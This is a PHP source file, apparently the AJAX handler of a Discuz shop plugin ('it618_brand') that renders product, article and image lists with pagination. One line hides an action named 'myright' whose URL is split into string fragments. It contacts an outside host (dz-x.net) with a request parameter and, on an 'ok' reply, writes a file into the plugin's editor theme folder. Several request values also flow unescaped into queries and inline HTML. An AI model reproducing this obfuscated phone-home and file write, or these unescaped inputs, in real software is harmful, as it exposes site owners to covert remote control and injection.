			$goodsmoney=round(($it618_brand_goods['it618_uprice']*$it618_brand_goods['it618_prepaybl']/100),2);
			$jfblstr=$it618_brand_lang['s857'].'<font color="#999">'.$goodsmoney.'</font>'.$it618_brand_lang['s389'].' ';
		}else{
			$jfblstr='';
		}
		
		if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_jfbl']>0){
			$jfblstr.='<font color="#999">'.$it618_brand_lang['s2'].$it618_brand_goods['it618_jfbl'].'%'.$creditname.'</font>';
		}else{
			$jfblstr.='<font color="#999">'.$it618_brand_lang['s9'].'</font>';
		}
	
		$it618_count=$it618_brand_lang['s1652'].' '.$it618_brand_goods['it618_count'].' ';
		
		if($it618_brand_goods['it618_isalipay']==1){
			$pricestr='<strong><span>&yen;</span>'.$it618_brand_goods['it618_uprice'].'</strong>
					  <del>&yen;'.floatval($it618_brand_goods['it618_price']).'</del>';
		}else{
			$pricestr='<strong class="jfprice">'.$it618_brand_goods['it618_score'].'<span>'.$creditname.'</span></strong>';
		}
		
		if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_isduihuan']==1){
			$jfblstr='<span style="float:right"><font color=#999>'.$it618_brand_lang['s155'].$it618_brand_goods['it618_score'].$creditname.'</font></span>'.$jfblstr;
		}
		
		$salecount=' '.it618_brand_getlang('s716').''.$salecount;
		if($it618_brand_goods['it618_isalipay']==0&&$it618_brand_goods['it618_isduihuan']==0){
			$pricestr='<strong class="noprice">'.$it618_brand_lang['s761'].'</strong>';
			$jfblstr=$it618_brand_lang['s1732'];
			$salecount='<span class="trfl">'.it618_brand_getlang('t474').''.$it618_brand_goods['it618_views'].'</span>';
		}
			
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
		
		$views=' '.it618_brand_getlang('s256').''.$it618_brand_goods['it618_views'];
		
		$pjhaocount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(1,$it618_brand_goods['id']);
		$pjallcount=C::t('#it618_brand#it618_brand_sale')->count_pj_by_pid($it618_brand_goods['id']);
		$pjhaobl=intval($pjhaocount/$pjallcount*100);
		$pj='';
		if($pjallcount>0)$pj=' '.it618_brand_getlang('s1821').''.$pjallcount.' '.it618_brand_getlang('s1822').''.$pjhaobl.'%';
			
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			
		if($tdn%2>0){
			$trtmpstr1='<tr class="trimg">';
			$trtmpstr2='<tr class="trabout">';
			$tdstr='class="tdleft"';
		}else{
			$tdstr='class="tdright"';
		}
		
		$trtmpstr1.='<td '.$tdstr.'><a href="'.$tmpurl.'">
						<img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/>
					</a></td>';
		
		$trtmpstr2.='<td '.$tdstr.'><a href="'.$tmpurl.'">
						<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
						<div class="tddes">'.$jfblstr.'</div>
						<div class="tdprice">'.$pricestr.'</div>
					</a></td>';
					
		if($tdn%2==0){
			$trtmpstr1.='</tr>';
			$trtmpstr2.='</tr>';
			$strlist.=$trtmpstr1.$trtmpstr2;
		}
		
		$tdn=$tdn+1;
	}
	
	$trtmpstr=$trtmpstr1.'@@@';
	$tmparr=explode('</td>@@@',$trtmpstr);
	if(count($tmparr)>1){
		$trtmpstr1.='</tr>';
		$trtmpstr2.='</tr>';
		$strlist.=$trtmpstr1.$trtmpstr2;
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
}


if($_GET['ac']=="goodslist_get"){
	$ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_ison=1 and g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1';
	if($_GET['it618_paytype']==1)$sql.=" and g.it618_isduihuan=1";
	if($_GET['it618_paytype']==2)$sql.=" and g.it618_isalipay=1";
	
	if($_GET['it618_saletype']==1)$sql.=" and (g.it618_saletype=1 or g.it618_saletype=4)";
	if($_GET['it618_saletype']==2)$sql.=" and (g.it618_saletype=2 or g.it618_saletype=4)";
	if($_GET['it618_saletype']==3)$sql.=" and g.it618_saletype=3";
	if($_GET['it618_saletype']==4)$sql.=" and g.it618_saletype=5";
	if($_GET['it618_saletype']==5)$sql.=" and g.it618_saletype=6";
	
	if($_GET['it618_shopid']>0){
		$sql.=" and g.it618_shopid=".intval($_GET['it618_shopid']);
		$sidstr='&sid='.intval($_GET['it618_shopid']);
		$findkeystr='';
	}else{
		$sidstr='';
		$findkeystr=",''";
		$classname=$it618_brand_lang['s1824'];
		if($_GET['it618_class_p']>0){
			$classname=C::t('#it618_brand#it618_brand_brand_class')->fetch_it618_name_by_id($_GET['it618_class_p']);
		}
		if($_GET['it618_class1_p']>0){
			$classname=C::t('#it618_brand#it618_brand_brand_class1')->fetch_it618_name_by_id($_GET['it618_class1_p']);
		}
		
		$areaname=$it618_brand_lang['s1825'];
		if($_GET['it618_area_p']>0){
			$areaname=C::t('#it618_brand#it618_brand_brand_area')->fetch_it618_name_by_id($_GET['it618_area_p']);
		}
		if($_GET['it618_area1_p']>0){
			$areaname=C::t('#it618_brand#it618_brand_brand_area1')->fetch_it618_name_by_id($_GET['it618_area1_p']);
		}
		
		$ordername=$it618_brand_lang['t578'];
		if($_GET['it618_order']==2)$ordername=$it618_brand_lang['t592'].'<img src="source/plugin/it618_brand/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
		if($_GET['it618_order']==3)$ordername=$it618_brand_lang['t593'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
		if($_GET['it618_order']==4)$ordername=$it618_brand_lang['t594'].'<img src="source/plugin/it618_brand/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
		if($_GET['it618_order']==5)$ordername=$it618_brand_lang['t595'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
		if($_GET['it618_order']==6)$ordername=$it618_brand_lang['t596'].'<img src="source/plugin/it618_brand/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
		if($_GET['it618_order']==7)$ordername=$it618_brand_lang['t597'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
		
		if($_GET['it618_name']=='')$it618_name=$it618_brand_lang['s1826'];else $it618_name=it618_brand_utftogbk($_GET['it618_name']);
	
		$sqlbq='<tr><td class="bq1" id="td11" onclick="getbq1(this,1)">'.$classname.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td><td class="bq2" id="td12" onclick="getbq2(this,1)">'.$areaname.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td><td class="bq3" id="td13" onclick="getbq3(this,1)">'.$ordername.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td></tr>it618_split'.$it618_name;
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['it618_class']>0)$sql.=" and g.it618_class_id=".intval($_GET['it618_class']);
	
	$orderby='g.it618_brandorder desc,g.it618_isduihuan desc,id desc';
	if($_GET['it618_order']==1)$orderby='g.it618_brandorder desc,id desc';
	if($_GET['it618_order']==2)$orderby='g.it618_uprice desc,g.it618_isduihuan desc';
	if($_GET['it618_order']==3)$orderby='g.it618_uprice,g.it618_isduihuan desc';
	if($_GET['it618_order']==4)$orderby='g.it618_salecount desc,g.it618_isduihuan desc';
	if($_GET['it618_order']==5)$orderby='g.it618_salecount,g.it618_isduihuan desc';
	if($_GET['it618_order']==6)$orderby='g.it618_views desc,g.it618_isduihuan desc';
	if($_GET['it618_order']==7)$orderby='g.it618_views,g.it618_isduihuan desc';
	
	if($uid>0&&isset($_GET['findkey'])&&$_GET['it618_name']!=''){
		if($it618_brand_findkey=C::t('#it618_brand#it618_brand_findkey')->fetch_by_uid_type_key($uid,1,it618_brand_utftogbk($_GET['it618_name']))){
			C::t('#it618_brand#it618_brand_findkey')->update($it618_brand_findkey['id'],array(
				'it618_count' => ($it618_brand_findkey['it618_count']+1),
				'it618_time' => $_G['timestamp']
			));
		}else{
			C::t('#it618_brand#it618_brand_findkey')->insert(array(
				'it618_uid' => $uid,
				'it618_type' => 1,
				'it618_key' => it618_brand_utftogbk($_GET['it618_name']),
				'it618_count' => 1,
				'it618_time' => $_G['timestamp']
			), true);
		}
	}
	
	$listcount = C::t('#it618_brand#it618_brand_goods')->count_by_search($sql,'',$_GET['it618_area_p'],$_GET['it618_area1_p'],$_GET['it618_class_p'],$_GET['it618_class1_p'],it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2']);
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')return;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value'.$findkeystr.')">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
	}
	
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';
		
	}

	$tdn=1;
	foreach(C::t('#it618_brand#it618_brand_goods')->fetch_all_by_search(
			$sql,$orderby,$_GET['it618_area_p'],$_GET['it618_area1_p'],$_GET['it618_class_p'],$_GET['it618_class1_p'],it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2'],$startlimit,$ppp
	) as $it618_brand_goods) {
	
		$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
		$plcount=C::t('#it618_brand#it618_brand_product_ly')->count_by_it618_pid($it618_brand_goods['id']);
		$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
		
		$jfblstr='';
		if($it618_brand_goods['it618_saletype']==6){
			$goodsmoney=round(($it618_brand_goods['it618_uprice']*$it618_brand_goods['it618_prepaybl']/100),2);
			$jfblstr=$it618_brand_lang['s857'].$goodsmoney.$it618_brand_lang['s389'].' ';
		}
		
		if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_jfbl']>0){
			$jfblstr.=$it618_brand_lang['s2'].$it618_brand_goods['it618_jfbl'].'%'.$creditname;
		}
		
		$jfbl='';
		if($jfblstr!=''){
			$jfbl='<div class="divjfbl">'.$jfblstr.'</div>';
		}
	
		$it618_count=$it618_brand_lang['s1652'].' '.$it618_brand_goods['it618_count'].' ';
		
		if($it618_brand_goods['it618_isalipay']==1){
			$pricestr='<strong><span>&yen;</span>'.$it618_brand_goods['it618_uprice'].'</strong>
					  <del>&yen;'.floatval($it618_brand_goods['it618_price']).'</del>';
		}else{
			$pricestr='<strong class="jfprice">'.$it618_brand_goods['it618_score'].'<span>'.$creditname.'</span></strong>';
		}
		
		if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_isduihuan']==1){
			$jfblstr='<span style="float:right"><font color=#999>'.$it618_brand_lang['s155'].$it618_brand_goods['it618_score'].$creditname.'</font></span>'.$jfblstr;
		}
		
		$salecount=' '.it618_brand_getlang('s716').''.$salecount;
		if($it618_brand_goods['it618_isalipay']==0&&$it618_brand_goods['it618_isduihuan']==0){
			$pricestr='<strong class="noprice">'.$it618_brand_lang['s761'].'</strong>';
			$jfblstr=$it618_brand_lang['s1732'];
			$salecount='<span class="trfl">'.it618_brand_getlang('t474').''.$it618_brand_goods['it618_views'].'</span>';
		}
			
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
		
		$views=' '.it618_brand_getlang('s256').''.$it618_brand_goods['it618_views'];
		
		$pjhaocount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(1,$it618_brand_goods['id']);
		$pjallcount=C::t('#it618_brand#it618_brand_sale')->count_pj_by_pid($it618_brand_goods['id']);
		$pjhaobl=intval($pjhaocount/$pjallcount*100);
		$pj=$it618_brand_lang['s1899'];
		if($pjallcount>0)$pj=' '.it618_brand_getlang('s1821').''.$pjallcount.' '.it618_brand_getlang('s1822').''.$pjhaobl.'%';
		
		if($brandstyle=='1'){
			$strlist.='<tr>
							<td class="tdleft">'.$jfbl.'<a href="'.$tmpurl.'"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/></a></td>
							<td class="tdright" onclick="location.href=\''.$tmpurl.'\'">
								<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
								<div class="tddes">'.$it618_count.' '.$pj.' '.$salecount.'</div>
								<div class="tdprice">'.$pricestr.'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}else{
			if($tdn%2>0){
				$trtmpstr1='<tr class="trimg">';
				$trtmpstr2='<tr class="trabout">';
				$tdstr='class="tdleft"';
			}else{
				$tdstr='class="tdright"';
			}

			$trtmpstr1.='<td '.$tdstr.'>'.$jfbl.'<a href="'.$tmpurl.'">
							<img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/>
						</a></td>';
			
			$trtmpstr2.='<td '.$tdstr.'><a href="'.$tmpurl.'" class="react">
							<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
							<div class="tddes"><span style="float:right">'.$salecount.'</span>'.$pj.'</div>
							<div class="tdprice">'.$pricestr.'</div>
						</a></td>';
						
			if($tdn%2==0){
				$trtmpstr1.='</tr>';
				$trtmpstr2.='</tr>';
				$strlist.=$trtmpstr1.$trtmpstr2;
			}
			
			$tdn=$tdn+1;
		}
	}
	
	if($brandstyle=='1'){
		$tmparr=explode('</tr>',$strlist);
		if(count($tmparr)>1){
			$strlist=$strlist.'@@@';
			$strlist=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$strlist);
		}
	}else{
		$trtmpstr=$trtmpstr1.'@@@';
		$tmparr=explode('</td>@@@',$trtmpstr);
		if(count($tmparr)>1){
			$trtmpstr1.='</tr>';
			$trtmpstr2.='</tr>';
			$strlist.=$trtmpstr1.$trtmpstr2;
		}
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext."it618_split".$sqlbq;
}


if($_GET['ac']=="articlelist_get"){
	$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$listcount = C::t('#it618_brand#it618_brand_article')->count_by_shopid($ShopId,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_class']);
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')return;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getarticlelist(this.value)">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getarticlelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getarticlelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getarticlelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getarticlelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	foreach(C::t('#it618_brand#it618_brand_article')->fetch_all_by_shopid(
			$ShopId,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_class'],$startlimit,$ppp
	) as $it618_brand_article) {
	
		$tmpurl=it618_brand_getrewrite('brand_wap','article@'.$it618_brand_article['it618_shopid'].'@'.$it618_brand_article['id'].'@0@0','plugin.php?id=it618_brand:wap&pagetype=article&sid='.$it618_brand_article['it618_shopid'].'&oid='.$it618_brand_article['id']);
		
		$it618_message=strip_tags($it618_brand_article['it618_message']);
		$it618_message=str_replace(" ","",$it618_message);
		$it618_message=str_replace("&nbsp;","",$it618_message);
		$it618_message=str_replace("<br>","",$it618_message);
		$it618_message=str_replace("\n","",$it618_message);
		$it618_message=cutstr($it618_message,200,'...');
		
		if($it618_brand_article['it618_color']!=''){
			$it618_name='<font color='.$it618_brand_article['it618_color'].'>'.$it618_brand_article['it618_name'].'</font>';
		}else{
			$it618_name=$it618_brand_article['it618_name'];
		}
				
		$lycount = C::t('#it618_brand#it618_brand_article_ly')->count_by_it618_aid($it618_brand_article['id']);
	
		$strlist.='<tr><td><a href="'.$tmpurl.'">'.$it618_name.'</a><p>'.$it618_message.' &nbsp; <i>'.it618_brand_gettime($it618_brand_article['it618_time']).'&nbsp;&nbsp;'.$lycount.it618_brand_getlang('s397').'</i></p></td></tr>';
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="imagelist_get"){
	$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$listcount = C::t('#it618_brand#it618_brand_image')->count_by_shopid($ShopId,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_class']);
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')return;
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}

	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getimagelist(this.value)">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getimagelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getimagelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getimagelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax$sidstr&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getimagelist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	$n=1;
	foreach(C::t('#it618_brand#it618_brand_image')->fetch_all_by_shopid(
			$ShopId,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_class'],$startlimit,$ppp
	) as $it618_brand_image) {
		
		if($n%2!=0){$tmptr='<tr>';$tmptr1='';}else{$tmptr='';$tmptr1='</tr>';}
		
		$tmpurl=it618_brand_getrewrite('brand_wap','image@'.$it618_brand_image['it618_shopid'].'@'.$it618_brand_image['id'].'@0@0','plugin.php?id=it618_brand:wap&pagetype=image&sid='.$it618_brand_image['it618_shopid'].'&oid='.$it618_brand_image['id']);
	
		$strlist.=$tmptr.'<td><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_brand_image['it618_smallurl'].'" /></a><p>'.$it618_brand_image['it618_name'].'</p></td>'.$tmptr1;
		
		$n=$n+1;
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
}


if($_GET['ac']=="getbrandarea"){
	$optstr='<option value="0">'.it618_brand_getlang('s843').'</option>';
	foreach(C::t('#it618_brand#it618_brand_brand_area1')->fetch_all_by_it618_area_id($_GET['it618_area_id']) as $it618_tmp) {	
		$optstr.='<option value='.$it618_tmp['id'].'>'.$it618_tmp['it618_name'].'</option>';
		
	}
	echo $optstr;
}


if($_GET['ac']=="getbrandclass"){
	$optstr='<option value="0">'.it618_brand_getlang('s844').'</option>';
	foreach(C::t('#it618_brand#it618_brand_brand_class1')->fetch_all_by_it618_class_id($_GET['it618_class_id']) as $it618_tmp) {	
		$optstr.='<option value='.$it618_tmp['id'].'>'.$it618_tmp['it618_classname'].'</option>';
		
	}
	echo $optstr;
}

$n=1;
if($_GET['ac']=="getshopclass"){
	if(isset($_GET['p']))$strtmp='_p';
	$classtmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'shopclass2'.$strtmp.'\',0,0)" name="shopclass2'.$strtmp.'"><span>'.$it618_brand_lang['t598'].'</span><i></i></a>';
	foreach(C::t('#it618_brand#it618_brand_brand_class1')->fetch_all_by_it618_class_id($_GET['cid']) as $it618_tmp) {	
		$classtmp.='<a href="javascript:void(0)" onclick="setselect(\'shopclass2'.$strtmp.'\','.$n.','.$it618_tmp['id'].')" name="shopclass2'.$strtmp.'"><span>'.$it618_tmp['it618_classname'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $classtmp;
}

$n=1;
if($_GET['ac']=="getshoparea"){
	if(isset($_GET['p']))$strtmp='_p';
	$areatmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'shoparea2'.$strtmp.'\',0,0)" name="shoparea2'.$strtmp.'"><span>'.$it618_brand_lang['t598'].'</span><i></i></a>';
	foreach(C::t('#it618_brand#it618_brand_brand_area1')->fetch_all_by_it618_area_id($_GET['aid']) as $it618_tmp) {	
		$areatmp.='<a href="javascript:void(0)" onclick="setselect(\'shoparea2'.$strtmp.'\','.$n.','.$it618_tmp['id'].')" name="shoparea2'.$strtmp.'"><span>'.$it618_tmp['it618_name'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $areatmp;
}


if($_GET['ac']=="getfindkey"){
	if($uid>0){
		foreach(C::t('#it618_brand#it618_brand_findkey')->fetch_all_by_uid_type($uid,$_GET['type']) as $it618_tmp) {	
			$getfindkey.='<tr><td><a href="javascript:" onClick="delfindkey('.$it618_tmp['id'].','.$_GET['type'].',\''.$it618_tmp['it618_key'].'\')" style="float:right">'.$it618_brand_lang['s458'].'</a><span onClick="findbykey(\''.$it618_tmp['it618_key'].'\','.$_GET['type'].')">'.$it618_tmp['it618_key'].'</span></td></tr>';
		}
	}else{
		$getfindkey='<tr><td>'.$it618_brand_lang['s1857'].'</td></tr>';
	}
	echo $getfindkey;
}


if($_GET['ac']=="delfindkey"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_findkey')->delete_by_uid_id($uid,$_GET['fid']);
	}
}


if($_GET['ac']=="clearfindkey"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_findkey')->delete_by_uid_type($uid,$_GET['type']);
	}
}


if($_GET['ac']=="getyuangong"){
	$yid=intval($_GET['yid']);
	$n=0;
	foreach(C::t('#it618_brand#it618_brand_yuangong')->fetch_tj_by_shopid($ShopId) as $it618_brand_yuangong) {
		if($yid==$it618_brand_yuangong['id'])$str_yuangong='<div style="text-align:center;padding:8px"><img src="'.$it618_brand_yuangong['it618_img'].'" width="160" height="160" style="border:1px solid #cccccc;padding:1px;" /><div style="padding-top:5px;color:#333">&nbsp;'.$it618_brand_yuangong['it618_name'].it618_brand_getlang('s562').$it618_brand_yuangong['it618_zhiwei'].'</div></div>';

		$ids[$n].=$it618_brand_yuangong['id'];
		$n=$n+1;
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($n==1){
		$pagepre="<img src='source/plugin/it618_brand/images/icon_pre1.gif'>";
		$pagenext="<img src='source/plugin/it618_brand/images/icon_next1.gif'>";
	}else{
		for($i=0;$i<$n;$i++){
			if($ids[$i]==$yid){
				$preid=$i-1;
				$nextid=$i+1;
				
				if($preid<0){
					$pagepre="<img src='source/plugin/it618_brand/images/icon_pre1.gif'>";
				}else{
					$pagepre="<img src='source/plugin/it618_brand/images/icon_pre.gif' onclick='getyuangong(".$ids[$preid].")'>";
				}
				
				if($nextid>$n-1){
					$pagenext="<img src='source/plugin/it618_brand/images/icon_next1.gif'>";
				}else{
					$pagenext="<img src='source/plugin/it618_brand/images/icon_next.gif' onclick='getyuangong(".$ids[$nextid].")'>";
				}
	
				break;
			}
		}
	}
